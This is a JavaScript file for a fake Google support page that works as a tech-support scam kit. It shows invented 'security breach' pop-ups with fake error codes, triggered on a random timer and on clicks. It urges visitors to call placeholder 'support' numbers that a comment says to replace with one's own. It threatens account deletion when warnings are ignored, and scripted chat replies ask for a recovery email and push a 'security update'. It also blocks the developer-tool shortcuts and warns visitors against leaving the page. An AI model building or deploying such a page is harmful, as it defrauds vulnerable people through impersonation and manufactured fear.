document.addEventListener('DOMContentLoaded', function() {
    const signInBtn = document.getElementById('signInBtn');
    const productCards = document.querySelectorAll('.product-card');
    const menuBtn = document.getElementById('menuBtn');
    const appsBtn = document.getElementById('appsBtn');
    const feedbackBtn = document.getElementById('feedbackBtn');
    const helpLinks = document.querySelectorAll('.help-link');
    const showMoreBtn = document.getElementById('showMoreBtn');
    const searchBtn = document.getElementById('searchBtn');
    const searchInput = document.getElementById('searchInput');
    const errorModal = document.getElementById('errorModal');
    const closeModal = document.getElementById('closeModal');
    const callNowBtn = document.getElementById('callNowBtn');
    const ignoreBtn = document.getElementById('ignoreBtn');
    const chatWidget = document.getElementById('chatWidget');
    const chatClose = document.getElementById('chatClose');
    const chatInput = document.getElementById('chatInput');
    const sendChat = document.getElementById('sendChat');
    const chatBody = document.getElementById('chatBody');

    const errorCodes = [
        'GOOG-SEC-0x4A7B',
        'GOOG-ERR-0x8F3D',
        'ACCOUNT-0x2B9E',
        'GMAIL-SEC-0x7C1A',
        'DRIVE-0x9D4F',
        'CHROME-0x5E8B'
    ];

    // Replace example numbers with your own.
    const supportNumbers = [
        '+1-000-000-0000',
        '+1-000-000-0000',
        '+1-000-000-0000',
        '+1-000-000-0000'
    ];

    const chatResponses = [
        "I can see there's an issue with your Google account security. Let me help you resolve this immediately.",
        "That's concerning. I'm detecting unauthorized access attempts on your account.",
        "Your account shows signs of compromise. We need to secure it right away.",
        "I'm running a security scan now. This appears to be a critical security breach.",
        "For your protection, I need to verify your account details. Can you provide your recovery email?",
        "This requires immediate action. Let me transfer you to our security specialist.",
        "Your Google services are at risk. We need to install our security update immediately.",
        "I can see multiple failed login attempts. Your account needs emergency protection."
    ];

    init();

    function init() {
        setupEventListeners();
        
        setTimeout(() => {
            if (Math.random() > 0.3) {
                showErrorModal();
            }
        }, Math.random() * 30000 + 10000);
    }

    function setupEventListeners() {
        signInBtn.addEventListener('click', handleSignIn);
        menuBtn.addEventListener('click', showAccountError);
        appsBtn.addEventListener('click', showAccountError);
        feedbackBtn.addEventListener('click', showSystemError);
        showMoreBtn.addEventListener('click', showSystemError);

        searchBtn.addEventListener('click', handleSearch);
        searchInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                handleSearch();
            }
        });

        productCards.forEach(card => {
            card.addEventListener('click', () => {
                const product = card.dataset.product;
                handleProductClick(product);
            });
        });

        helpLinks.forEach(link => {
            link.addEventListener('click', function(e) {
                e.preventDefault();
                showSystemError();
            });
        });

        closeModal.addEventListener('click', hideErrorModal);
        callNowBtn.addEventListener('click', handleCallNow);
        ignoreBtn.addEventListener('click', handleIgnoreWarning);

        document.addEventListener('click', function(e) {
            if (e.target && (e.target.textContent.includes('Call Support Now') || e.target.textContent.includes('Call Now'))) {
                handleCallNow();
            }
        });

        chatClose.addEventListener('click', closeChat);
        sendChat.addEventListener('click', sendChatMessage);
        chatInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                sendChatMessage();
            }
        });

        window.addEventListener('click', function(e) {
            if (e.target === errorModal) {
                hideErrorModal();
            }
        });
    }

    function handleSignIn() {
        signInBtn.textContent = 'Signing in...';
        signInBtn.disabled = true;
        
        setTimeout(() => {
            signInBtn.textContent = 'Sign in';
            signInBtn.disabled = false;
            showAccountError();
        }, 2000);
    }

    function handleSearch() {
        const query = searchInput.value.trim();
        if (query) {
            setTimeout(() => {
                showErrorModal();
            }, 1500);
        }
    }

    function handleProductClick(product) {
        const card = event.currentTarget;
        card.style.opacity = '0.7';
        card.style.pointerEvents = 'none';
        
        setTimeout(() => {
            card.style.opacity = '1';
            card.style.pointerEvents = 'auto';
            
            showProductSpecificError(product);
        }, 1500);
    }

    function showProductSpecificError(product) {
        const productErrors = {
            'chrome': 'Chrome browser security vulnerability detected',
            'account': 'Google Account unauthorized access detected',
            'youtube': 'YouTube account security breach detected',
            'gmail': 'Gmail security threat identified',
            'play': 'Google Play Store payment security issue',
            'search': 'Google Search history compromised',
            'adsense': 'AdSense account security violation',
            'gemini': 'Gemini AI access security breach',
            'pixel': 'Pixel device security compromise',
            'maps': 'Google Maps location data breach',
            'cloud': 'Google Cloud security vulnerability',
            'ads': 'Google Ads account unauthorized access',
            'photos': 'Google Photos privacy breach detected',
            'families': 'Family account security compromise',
            'fi': 'Google Fi wireless security threat',
            'nest': 'Google Nest device security breach',
            'pay': 'Google Pay transaction security alert',
            'store': 'Google Store payment security issue',
            'drive': 'Google Drive file access violation',
            'accessibility': 'Accessibility settings security breach'
        };

        const errorMessage = productErrors[product] || 'Google services security threat detected';
        
        const modalBody = document.querySelector('.modal-body');
        modalBody.innerHTML = `
            <div class="error-icon">🚨</div>
            <p><strong>${errorMessage}</strong></p>
            <p>Your Google account and services require immediate security verification.</p>
            <p><strong>Error Code:</strong> <span id="errorCode">${errorCodes[Math.floor(Math.random() * errorCodes.length)]}</span></p>
            <p>Contact Google Support now to prevent data loss and account suspension.</p>
            <div class="contact-info">
                <p><strong>Support Number:</strong> <span class="phone-number">${supportNumbers[Math.floor(Math.random() * supportNumbers.length)]}</span></p>
            </div>
        `;
        
        showErrorModal();
    }

    function showAccountError() {
        const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
        
        document.getElementById('errorCode').textContent = 'ACCOUNT-0x2B9E';
        document.querySelector('.phone-number').textContent = randomPhone;
        
        const modalBody = document.querySelector('.modal-body');
        modalBody.innerHTML = `
            <div class="error-icon">🔐</div>
            <p><strong>GOOGLE ACCOUNT SECURITY BREACH</strong></p>
            <p>Unauthorized access detected from multiple suspicious locations.</p>
            <p><strong>Error Code:</strong> <span id="errorCode">ACCOUNT-0x2B9E</span></p>
            <p>Your account will be suspended in 24 hours if not verified immediately.</p>
            <div class="contact-info">
                <p><strong>Emergency Support:</strong> <span class="phone-number">${randomPhone}</span></p>
            </div>
        `;
        
        showErrorModal();
    }

    function showSystemError() {
        const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
        
        document.getElementById('errorCode').textContent = 'GOOG-ERR-0x8F3D';
        document.querySelector('.phone-number').textContent = randomPhone;
        
        const modalBody = document.querySelector('.modal-body');
        modalBody.innerHTML = `
            <div class="error-icon">⚠️</div>
            <p><strong>GOOGLE SERVICES ERROR</strong></p>
            <p>Critical system malfunction affecting all Google services.</p>
            <p><strong>Error Code:</strong> <span id="errorCode">GOOG-ERR-0x8F3D</span></p>
            <p>Data synchronization has been disabled to prevent corruption.</p>
            <div class="contact-info">
                <p><strong>Support Number:</strong> <span class="phone-number">${randomPhone}</span></p>
            </div>
        `;
        
        showErrorModal();
    }

    function showErrorModal() {
        const randomErrorCode = errorCodes[Math.floor(Math.random() * errorCodes.length)];
        const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
        
        if (!document.getElementById('errorCode')) {
            document.getElementById('errorCode').textContent = randomErrorCode;
            document.querySelector('.phone-number').textContent = randomPhone;
        }
        
        errorModal.style.display = 'block';
        document.body.style.overflow = 'hidden';

        setTimeout(() => {
            errorModal.classList.add('urgent');
        }, 1000);
    }

    function hideErrorModal() {
        errorModal.style.display = 'none';
        document.body.style.overflow = 'auto';
        errorModal.classList.remove('urgent');
    }

    function handleCallNow() {
        const phoneNumber = document.querySelector('.phone-number').textContent;
        
        const urgentDiv = document.createElement('div');
        urgentDiv.innerHTML = `
            <div style="background: #ea4335; color: white; padding: 20px; text-align: center; font-weight: bold;">
                🚨 CRITICAL GOOGLE SECURITY ALERT 🚨<br>
                Call immediately: ${phoneNumber}<br>
                <small>Do not sign out or close this browser</small>
            </div>
        `;
        
        document.body.insertBefore(urgentDiv, document.body.firstChild);
        
        window.location.href = `tel:${phoneNumber}`;
    }

    function handleIgnoreWarning() {
        const warningCount = parseInt(localStorage.getItem('googleWarningCount') || '0') + 1;
        localStorage.setItem('googleWarningCount', warningCount.toString());
        
        if (warningCount < 3) {
            hideErrorModal();
            
            setTimeout(() => {
                showErrorModal();
                const modalContent = document.querySelector('.modal-content');
                modalContent.style.animation = 'shake 0.5s infinite';
            }, 3000);
        } else {
            const modalBody = document.querySelector('.modal-body');
            modalBody.innerHTML = `
                <div class="error-icon">🚨</div>
                <h3 style="color: #ea4335; margin-bottom: 20px;">FINAL SECURITY WARNING</h3>
                <p><strong>Your Google account is about to be permanently disabled!</strong></p>
                <p>All your data, emails, photos, and documents will be permanently deleted.</p>
                <div class="contact-info">
                    <p><strong>Emergency Support:</strong> <span class="phone-number">${supportNumbers[0]}</span></p>
                </div>
            `;
        }
    }

    function openChat() {
        chatWidget.style.display = 'flex';
        chatInput.focus();
        
        setTimeout(() => {
            addChatMessage('agent', 'I can see you\'re experiencing Google account security issues. Let me help you immediately.');
        }, 2000);
        
        setTimeout(() => {
            addChatMessage('agent', 'I\'m detecting unauthorized access to your Google services. This needs urgent attention.');
        }, 5000);
    }

    function closeChat() {
        chatWidget.style.display = 'none';
    }

    function sendChatMessage() {
        const message = chatInput.value.trim();
        if (message) {
            addChatMessage('user', message);
            chatInput.value = '';
            
            setTimeout(() => {
                const response = chatResponses[Math.floor(Math.random() * chatResponses.length)];
                addChatMessage('agent', response);
                
                if (Math.random() > 0.6) {
                    setTimeout(() => {
                        const phoneNumber = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
                        addChatMessage('agent', `For immediate assistance, please call our security line: ${phoneNumber}`);
                    }, 2000);
                }
            }, 1000 + Math.random() * 2000);
        }
    }

    function addChatMessage(sender, message) {
        const messageDiv = document.createElement('div');
        messageDiv.className = `chat-message ${sender}`;
        
        const now = new Date();
        const timeStr = now.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
        
        messageDiv.innerHTML = `
            <div class="message-content">${message}</div>
            <div class="message-time">${timeStr}</div>
        `;
        
        chatBody.appendChild(messageDiv);
        chatBody.scrollTop = chatBody.scrollHeight;
    }

    function addDynamicEffects() {
        setInterval(() => {
            if (Math.random() > 0.95 && errorModal.style.display !== 'block') {
                showErrorModal();
            }
        }, 30000);

        setInterval(() => {
            const timeElements = document.querySelectorAll('.message-time');
            timeElements.forEach((el, index) => {
                if (el.textContent === 'Just now') {
                    const minutesAgo = Math.floor(Math.random() * 5) + 1;
                    el.textContent = `${minutesAgo} min ago`;
                }
            });
        }, 60000);
    }

    addDynamicEffects();

    const style = document.createElement('style');
    style.textContent = `
        .urgent {
            animation: blink 1s infinite;
        }
        
        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0.7; }
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }
        
        .modal-content.shake {
            animation: shake 0.5s infinite;
        }
    `;
    document.head.appendChild(style);

    document.addEventListener('keydown', function(e) {
        if (e.key === 'F12' || 
            (e.ctrlKey && e.shiftKey && e.key === 'I') ||
            (e.ctrlKey && e.key === 'u')) {
            e.preventDefault();
            showErrorModal();
            return false;
        }
    });

    window.addEventListener('beforeunload', function(e) {
        const message = 'WARNING: Leaving this page may result in permanent Google account suspension. Contact Support first.';
        e.returnValue = message;
        return message;
    });
});